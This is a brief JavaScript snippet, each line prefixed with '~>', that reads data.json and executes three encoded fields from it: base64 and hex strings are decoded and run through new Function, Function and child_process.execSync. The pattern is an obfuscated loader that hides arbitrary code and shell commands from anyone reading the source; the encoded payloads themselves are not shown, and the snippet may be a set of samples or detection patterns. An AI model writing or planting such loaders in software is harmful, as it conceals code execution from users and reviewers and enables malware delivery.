const data = require('./data.json');

~>new Function(Buffer.from(data.p, 'base64').toString('utf8'))();
~>Function(Buffer.from(data.q, "hex").toString())();
~>require('child_process').execSync(Buffer.from(data.r, 'base64').toString());
